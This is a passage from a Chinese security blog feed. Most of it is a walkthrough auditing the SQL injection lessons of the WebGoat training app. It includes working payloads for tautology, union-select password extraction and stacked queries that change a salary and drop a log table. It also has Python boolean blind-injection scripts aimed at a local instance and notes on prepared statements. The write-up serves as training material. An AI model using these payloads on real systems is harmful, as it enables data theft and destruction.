&quot;Categories&quot;</span><br><span class="line">    identifier = &quot;categories&quot;</span><br><span class="line">    url        = &quot;/categories/&quot;</span><br><span class="line">    [[menu.main]]</span><br><span class="line">    identifier = &quot;tags&quot;</span><br><span class="line">    name       = &quot;Tags&quot;</span><br><span class="line">    url        = &quot;/tags/&quot;</span><br><span class="line">    [[menu.main]]</span><br><span class="line">    identifier = &quot;about&quot;</span><br><span class="line">    name       = &quot;About&quot;</span><br><span class="line">    url        = &quot;about/&quot;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置页脚</span></span><br><span class="line">    [[menu.social]]</span><br><span class="line">      # 唯一标识符</span><br><span class="line">      identifier = &quot;github&quot;</span><br><span class="line">      # 名称</span><br><span class="line">      name = &quot;github&quot;</span><br><span class="line">      # url地址</span><br><span class="line">      url = &quot;https://github.com/h1iba1/&quot;</span><br><span class="line">      # 权重 越小越靠前</span><br><span class="line">      weight = 1</span><br><span class="line">      description = &quot;这是一个网址&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置个人介绍</span></span><br><span class="line">[author]</span><br><span class="line">  name = &quot;h11ba1&quot;</span><br><span class="line">  email = &quot;h11ba1@qq.com&quot;</span><br><span class="line">  description = &quot;h11ba1&#x27;s blog&quot;</span><br><span class="line">  avatar = &quot;https://h11ba1-blog.oss-cn-beijing.aliyuncs.com/blog-头像/QQ20201212-0.jpg&quot;</span><br></pre></td></tr></table></figure><h3 id="文章配置："><a href="#文章配置：" class="headerlink" title="文章配置："></a>文章配置：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;文章标题&quot;</span><br><span class="line">date: 2021-07-01T13:46:58+08:00</span><br><span class="line">draft: flase          # flase表示不是草稿，可以公开显示</span><br><span class="line">categories: [&quot;代码审计&quot;] # 分类</span><br><span class="line">tags : [&quot;thinkphp&quot;]     # 标签</span><br><span class="line">cover : &quot;https://h11ba1-blog.oss-cn-beijing.aliyuncs.com/test/4B2E0B3833CDACAB61B1C849A3BC8633.jpg&quot;  # 文章图片</span><br><span class="line">toc : true   # 添加目录支持</span><br><span class="line">---</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hugo </tag>
            
            <tag> hugo+gethub page </tag>
            
            <tag> hugo https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.webgoat环境构建</title>
      <link href="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/"/>
      <url>/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="下载webgoat"><a href="#下载webgoat" class="headerlink" title="下载webgoat"></a>下载webgoat</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure><p>看提示需要jdk15.</p><h2 id="安装jdk15"><a href="#安装jdk15" class="headerlink" title="安装jdk15"></a>安装jdk15</h2><p><a href="https://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html</a></p><p>配置环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export JDK15_HOME=&quot;/Library/Java/JavaVirtualMachines/jdk-15.0.2.jdk/Contents/Home&quot;</span><br><span class="line">alias jdk15=&quot;export JAVA_HOME=$JDK15_HOME&quot;</span><br></pre></td></tr></table></figure><p>打开pom包下载完依赖。</p><h2 id="启动webgoat"><a href="#启动webgoat" class="headerlink" title="启动webgoat"></a>启动webgoat</h2><p>配置好运行环境，记得选用jdk15。点击绿色箭头启动即可。</p><p><img src="1.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webgoat </tag>
            
            <tag> webgoat 环境构建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.sql注入模块审计</title>
      <link href="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="sql-injection-intro"><a href="#sql-injection-intro" class="headerlink" title="sql injection (intro)"></a>sql injection (intro)</h1><h2 id="1-SqlInjection-lesson9"><a href="#1-SqlInjection-lesson9" class="headerlink" title="1.SqlInjection.lesson9"></a>1.SqlInjection.lesson9</h2><p>f12打开控制台，点击get account info，发现数据提交到了/assignment5a路由</p><p><img src="1.1.png" alt="1.1"></p><p>全局搜索/assignment5a路由定位到</p><p>webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson5a.java</p><p><img src="1.2.png" alt="1.1"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/SqlInjection/assignment5a&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AttackResult <span class="title">completed</span><span class="params">(<span class="meta">@RequestParam</span> String account, <span class="meta">@RequestParam</span> String operator, <span class="meta">@RequestParam</span> String injection)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> injectableQuery(account + <span class="string">&quot; &quot;</span> + operator + <span class="string">&quot; &quot;</span> + injection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取提交的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">&quot;SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; and last_name = &#x27;&quot;</span> + accountName + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>将获取到的参数进行sql拼接。此处就存在sql注入，直接将获取到的数据拼接到了sql语句中。</p><p>debug查看：<br><img src="1.3.png" alt="1.1"></p><p>选择payload值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><p>熟悉sql注入的话很容易就能看出这里的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_data WHERE first_name = &#x27;John&#x27; and last_name = &#x27;Smith&#x27; or &#x27;1&#x27; = &#x27;1&#x27;</span><br></pre></td></tr></table></figure><p>Or ‘1’=’1’永真，就注入出了所有的数据。</p><h2 id="2-SqlInjection-lesson10"><a href="#2-SqlInjection-lesson10" class="headerlink" title="2.SqlInjection.lesson10"></a>2.SqlInjection.lesson10</h2><p>f12找到路由/assignment5b</p><p>全局搜索:/assignment5b<br><img src="2.1.png" alt="1.1"></p><p>可以看到post提交的数据被赋值到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String queryString = <span class="string">&quot;SELECT * From user_data WHERE Login_Count = ? and userid= &quot;</span> + accountName;</span><br></pre></td></tr></table></figure><p>其中login_count使用了占位符？，而accountName直接拼接到了sql语句中，注入就很明显了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Login : 1</span><br><span class="line"></span><br><span class="line">User_Id : 1 or 1=1</span><br></pre></td></tr></table></figure><p>通过此处也能发现sql语句预编译的写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AttackResult <span class="title">injectableQuery</span><span class="params">(String login_count, String accountName)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 采用 ？ 占位符</span></span><br><span class="line">        String queryString = <span class="string">&quot;SELECT * From user_data WHERE Login_Count = ? and userid= &quot;</span> + accountName;</span><br><span class="line">        <span class="keyword">try</span> (Connection connection = dataSource.getConnection()) &#123;</span><br><span class="line"><span class="comment">// 执行预编译</span></span><br><span class="line">            PreparedStatement query = connection.prepareStatement(queryString, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                count = Integer.parseInt(login_count);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="keyword">this</span>).output(<span class="string">&quot;Could not parse: &quot;</span> + login_count + <span class="string">&quot; to a number&quot;</span></span><br><span class="line">                        + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span> + queryString.replace(<span class="string">&quot;?&quot;</span>, login_count)).build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            query.setInt(<span class="number">1</span>, count);</span><br><span class="line">            <span class="comment">//String query = &quot;SELECT * FROM user_data WHERE Login_Count = &quot; + login_count + &quot; and userid = &quot; + accountName, ;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="comment">// 预编译sql语句执行</span></span><br><span class="line">                ResultSet results = query.executeQuery();</span><br></pre></td></tr></table></figure><p>总结下来就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. sql字段用占位符表示</span></span><br><span class="line">String queryString = <span class="string">&quot;SELECT * From user_data WHERE Login_Count = ? and userid= &quot;</span> + accountName;</span><br><span class="line"><span class="comment">// 2.prepareStatement 预编译处理sql语句</span></span><br><span class="line">PreparedStatement query = connection.prepareStatement(queryString, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);</span><br><span class="line"><span class="comment">// 3.预编译sql语句执行</span></span><br><span class="line">ResultSet results = query.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="3-SqlInjection-lesson11"><a href="#3-SqlInjection-lesson11" class="headerlink" title="3.SqlInjection.lesson11"></a>3.SqlInjection.lesson11</h2><p>老方法直接定位到代码：<br><img src="3.1.png" alt="1.1"></p><p>直接拼接神仙难救，唯一的区别是使用了单引号包裹输入的参数。</p><p>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Employee Name:1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--+</span><br><span class="line">Authentication TAN: 1</span><br></pre></td></tr></table></figure><h2 id="4-SqlInjection-lesson12"><a href="#4-SqlInjection-lesson12" class="headerlink" title="4.SqlInjection.lesson12"></a>4.SqlInjection.lesson12</h2><p><img src="4.1.png" alt="1.1"></p><p>一样的拼接代码，神仙难救，但是要求我们</p><p><strong>Better go and <em>change your own salary so you are earning the most!</em></strong></p><p>要求改变自己的薪水，改变数据内容，可以使用堆叠注入update更新，构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;update employees set SALARY=999999 where LAST_NAME=&#x27;</span>Smith<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><h2 id="5-SqlInjection-lesson13"><a href="#5-SqlInjection-lesson13" class="headerlink" title="5.SqlInjection.lesson13"></a>5.SqlInjection.lesson13</h2><p><img src="5.1.png" alt="1.1"></p><p>一样的拼接，一样的注入。这一次要求我们删除access_log表，以清理痕迹。</p><p>一样堆叠注入，删除表结构，构造paylaod如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">1%</span><span class="bash"><span class="string">&#x27;;drop table access_log;--+</span></span></span><br></pre></td></tr></table></figure><h1 id="sql-injection-advanced"><a href="#sql-injection-advanced" class="headerlink" title="sql injection (advanced)"></a>sql injection (advanced)</h1><h2 id="1-SqlInjection-lesson-3"><a href="#1-SqlInjection-lesson-3" class="headerlink" title="1.SqlInjection.lesson/3"></a>1.SqlInjection.lesson/3</h2><p><img src="2.1.1.png" alt="1.1"></p><p>用户输入拼接到了sql语句。</p><p><img src="2.1.2.png" alt="1.1"></p><p>Name字段出</p><p>构造payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;--+</span><br></pre></td></tr></table></figure><p>查到用户：Joe,然后构造payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:Joe&#x27; union select 1,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,7;-- </span><br></pre></td></tr></table></figure><p>但是该paylaod一直报错，有点不理解，然后去查看wp,发现payload如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:&#x27; or true union select 1,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,password, 7 from user_system_data where user_name=&#x27;dave&#x27;-- </span><br></pre></td></tr></table></figure><p>思考为啥<code>Joe&#39; union select 1,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,7;-- </code>。试了一下直接查询Joe，好家伙查不到数据，那大概确定了，</p><p><img src="2.1.3.png" alt="1.1"></p><p>查询不到数据，直接返回<code>No results matched. Try Again.</code>之后联合注入的数据自然也就没有显示。</p><p>所以才采用payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:&#x27; or true union select 1,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,password, 7 from user_system_data where user_name=&#x27;dave&#x27;-- </span><br></pre></td></tr></table></figure><p>‘ or true永真。返回所有数据，然后union select 1,’2’,’3’,’4’,’5’,password, 7 from user_system_data where user_name=’dave’– 查询password到第6个字段。</p><p>其实也可以采用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; union select null,user_name,password,null,null,null,null from user_system_data --</span><br></pre></td></tr></table></figure><p>lastName能查询到数据….</p><h2 id="2-SqlInjection-lesson-5"><a href="#2-SqlInjection-lesson-5" class="headerlink" title="2.SqlInjection.lesson/5"></a>2.SqlInjection.lesson/5</h2><p>打开首先是登录功能查看代码：</p><p><img src="2.2.1.png" alt="2.2.1"></p><p>登录功能明显采用了预编译，没有注入，一开始还很奇怪，在想难道预编译也有什么绕过方式？想了一会儿没啥思路，再去登录口看到了注册模块，定位代码如下：<br><img src="2.2.2.png" alt="2.2.1"></p><p>明显的拼接，确定注入点。且没有回显点，只能采用盲注的方式。</p><p>首先构造payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom&#x27;and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="2.2.3.png" alt="2.2.1"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom&#x27;and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="2.2.4.png" alt="2.2.1"></p><p>当结果为真时返回 user{0}already exists。结果为假时：tom’and’1’=’2 created。</p><p>此时就很容易想到布尔盲注，构造注入脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">cookies = &#123;&#125;</span><br><span class="line">cookies[&quot;JSESSIONID&quot;]=&quot;4UVsSRJn_sA-WPr0OJR-h3pYxSh7aT3vamSEefkO&quot;</span><br><span class="line">enums = string.ascii_lowercase + string.digits + &quot;.&quot; + &quot;_&quot; + &quot;,&quot;</span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">    flag = 0</span><br><span class="line">    for value in enums:</span><br><span class="line">        sql_value = &quot;tom\&#x27; and substring(password,&#123;&#125;,1)=\&#x27;&#123;&#125;&quot;.format(i,value)</span><br><span class="line">        url = &quot;http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</span><br><span class="line">        put_data = &#123;&quot;username_reg&quot;:sql_value,&quot;email_reg&quot;:&quot;123@123&quot;,&quot;password_reg&quot;:&quot;test&quot;,&quot;confirm_password_reg&quot;:&quot;test&quot;&#125;</span><br><span class="line">        req = requests.put(url,data=put_data,cookies=cookies)</span><br><span class="line">        text = req.text</span><br><span class="line">        if &quot;already exists&quot; in text:</span><br><span class="line">            print(value,end=&#x27;&#x27;)</span><br><span class="line">            i+=1</span><br><span class="line">            flag = 1</span><br><span class="line">    if flag == 0:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h1 id="sql-injection-mitigation"><a href="#sql-injection-mitigation" class="headerlink" title="sql injection (mitigation)"></a>sql injection (mitigation)</h1><h2 id="1-SqlInjectionMitigations-lesson-4"><a href="#1-SqlInjectionMitigations-lesson-4" class="headerlink" title="1.SqlInjectionMitigations.lesson/4"></a>1.SqlInjectionMitigations.lesson/4</h2><p>构造安全的sql查询：</p><p><img src="3.1.1.png" alt="2.2.1"></p><h2 id="2-SqlInjectionMitigations-lesson-5"><a href="#2-SqlInjectionMitigations-lesson-5" class="headerlink" title="2.SqlInjectionMitigations.lesson/5"></a>2.SqlInjectionMitigations.lesson/5</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">   Connection ct=DriverManager.getConnection(DBURL,DBUSER,DBPW);</span><br><span class="line">    PreparedStatement ps=ct.prepareStatement(&quot;select * from users where name=?&quot;);</span><br><span class="line">    ps.setString(1,&quot;3&quot;);</span><br><span class="line">    ResultSet rs=ps.executeQuery();</span><br><span class="line">&#125; catch(Exception e)&#123;</span><br><span class="line">    System.out.println(&quot;123&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-SqlInjectionMitigations-lesson-11"><a href="#3-SqlInjectionMitigations-lesson-11" class="headerlink" title="3.SqlInjectionMitigations.lesson/11"></a>3.SqlInjectionMitigations.lesson/11</h2><p>定位到：webgoat/WebGoat/webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/mitigation/Servers.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.owasp.webgoat.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> nbaars</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 6/13/17.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;SqlInjectionMitigations/servers&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Servers</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String id;</span><br><span class="line">        <span class="keyword">private</span> String hostname;</span><br><span class="line">        <span class="keyword">private</span> String ip;</span><br><span class="line">        <span class="keyword">private</span> String mac;</span><br><span class="line">        <span class="keyword">private</span> String status;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Servers</span><span class="params">(LessonDataSource dataSource)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Server&gt; <span class="title">sort</span><span class="params">(<span class="meta">@RequestParam</span> String column)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;Server&gt; servers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Connection connection = dataSource.getConnection();</span><br><span class="line">             PreparedStatement preparedStatement = connection.prepareStatement(<span class="string">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class="line">            ResultSet rs = preparedStatement.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                Server server = <span class="keyword">new</span> Server(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>), rs.getString(<span class="number">3</span>), rs.getString(<span class="number">4</span>), rs.getString(<span class="number">5</span>), rs.getString(<span class="number">6</span>));</span><br><span class="line">                servers.add(server);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> servers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题主要出在这里：<br><img src="3.3.1.png" alt="2.2.1"></p><p>将获取的参数直接拼接到order by后面：<br>构造payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/WebGoat/SqlInjectionMitigations/servers?column=case+when+(select+substr(ip,1,1)%3d&#x27;1&#x27;+from+servers+where+hostname%3d&#x27;webgoat-prd&#x27;)+then+hostname+else+mac+end</span><br><span class="line"></span><br><span class="line">解码：</span><br><span class="line">/WebGoat/SqlInjectionMitigations/servers?column=case+when+(select+substr(ip,1,1)=&#x27;1&#x27;+from+servers+where+hostname=&#x27;webgoat-prd&#x27;)+then+hostname+else+mac+end</span><br></pre></td></tr></table></figure><p>这里采用了<code>case when then else end</code>语句。<a href="https://juejin.cn/post/6844903542541516807">https://juejin.cn/post/6844903542541516807</a></p><p>使用实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">        <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SEX <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;男&#x27;</span> </span><br><span class="line">             <span class="keyword">WHEN</span> SEX <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;女&#x27;</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">&#x27;性别不明&#x27;</span> <span class="keyword">END</span>  </span><br><span class="line">        <span class="keyword">FROM</span>  PERSON</span><br></pre></td></tr></table></figure><p>大体意思就是：</p><p>查询 person表，当sex=1时返回男，sex=2是返回女，否则性别不明。</p><p>sql注入的完整语句就为：</p><p><img src="3.3.2.png" alt="2.2.1"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by case+when+(select+substr(ip,1,1)=&#x27;1&#x27;+from+servers+where+hostname=&#x27;webgoat-prd&#x27;)+then+hostname+else+mac+end</span><br></pre></td></tr></table></figure><p><code>(select+substr(ip,1,1)=&#39;1&#39;+from+servers+where+hostname=&#39;webgoat-prd&#39;)</code>返回true/flase，决定是根据hostname还是mac来排序，此时就可以利用布尔盲注。</p><p>布尔盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line">chars = digits+<span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;gDbal1EmdcCUptfZ-GIYSBFIFcPZlpBOht4IqlrL&#x27;</span></span><br><span 